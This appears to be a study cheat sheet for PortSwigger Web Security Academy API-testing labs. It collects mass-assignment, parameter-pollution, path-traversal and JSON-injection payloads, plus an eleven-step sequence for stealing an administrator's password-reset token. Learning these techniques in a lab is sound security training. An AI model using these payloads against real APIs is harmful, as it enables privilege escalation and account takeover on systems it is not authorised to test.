# API Testing — Scripts & Payloads
> PortSwigger Web Security Academy

---

## Mass Assignment Payloads

### Add hidden fields to a POST/PATCH request
```json
{
  "username": "peter",
  "email": "peter@example.com",
  "isAdmin": true
}

{
  "username": "peter",
  "email": "peter@example.com",
  "role": "administrator"
}

{
  "username": "peter",
  "email": "peter@example.com",
  "balance": 99999
}
```

---

## Query String Pollution Payloads

### Truncation (`#` → `%23`)
```
# Basic truncation — cut off what comes after
peter%23

# With diagnostic string — helps read the response
peter%23foo

# Truncate to remove a security parameter
administrator%23
administrator%23foo
```

### Parameter Injection (`&` → `%26`)
```
# Start with a fake parameter to confirm injection works
peter%26foo=xyz

# Once confirmed, inject real parameter names
peter%26role=admin
peter%26isAdmin=true
peter%26publicProfile=false
peter%26access_level=administrator
```

### Parameter Override (same name twice)
```
# Override with your own value
peter%26name=administrator
peter%26username=administrator
```

### Question Mark Test
```
# Test whether input sits in URL path or query string
administrator%3F
```

---

## Path Traversal Payloads

### Basic Navigation
```
# Same directory (baseline test)
./administrator

# Go back one level
../administrator

# Go back multiple levels
../../administrator
../../../administrator
../../../../administrator
```

### Finding API Root (increment until "Not found")
```
../%23
../../%23
../../../%23
../../../../%23       ← "Not found" = you're outside the API root
```

### Fetching API Documentation
```
../../../../openapi.json%23
../../../../openapi.yaml%23
../../../../swagger.json%23
../../../../swagger.yaml%23
../../../../api-docs%23
```

---

## JSON Injection Payloads

### Plain Text Input → JSON Body
```
# Basic privilege escalation
peter","access_level":"administrator

# Role injection
peter","role":"admin

# Multiple fields
peter","role":"admin","verified":"true
```

### JSON Input → JSON Body (escaped quotes)
```json
{"name": "peter\",\"access_level\":\"administrator"}
{"name": "peter\",\"role\":\"admin"}
{"name": "peter\",\"isAdmin\":\"true"}
```

---

## Content-Type Switching

### Switch to XML
```
Header:
Content-Type: application/xml

Body (converted from JSON {"username":"admin","password":"test"}):
<root>
  <username>admin</username>
  <password>test</password>
</root>
```

### Switch to Form URL Encoded
```
Header:
Content-Type: application/x-www-form-urlencoded

Body:
username=admin&password=test
```

---

## Expert Lab — Full Payload Sequence
### Password Reset Token Takeover

```
# Step 1 — Confirm input is placed in URL path (truncation)
username=administrator%23

# Step 2 — Confirm with question mark
username=administrator%3F

# Step 3 — Confirm same-level navigation works
username=./administrator

# Step 4 — Confirm traversal works
username=../administrator

# Step 5 — Navigate to API root incrementally
username=../%23
username=../../%23
username=../../../%23
username=../../../../%23         ← "Not found" = at root

# Step 6 — Fetch API blueprint
username=../../../../openapi.json%23

# Step 7 — Test discovered endpoint with invalid field
username=administrator/field/foo%23

# Step 8 — Test with valid field
username=administrator/field/email%23

# Step 9 — Try password reset token field
username=administrator/field/passwordResetToken%23

# Step 10 — Switch to correct API version
username=../../v1/users/administrator/field/passwordResetToken%23

# Step 11 — Use retrieved token in browser
/forgot-password?passwordResetToken=PASTE_TOKEN_HERE
```

---

## Common Hidden Field Names to Try

```
isAdmin
admin
role
verified
active
balance
credits
accessLevel
access_level
permissions
status
passwordResetToken
resetToken
apiKey
```
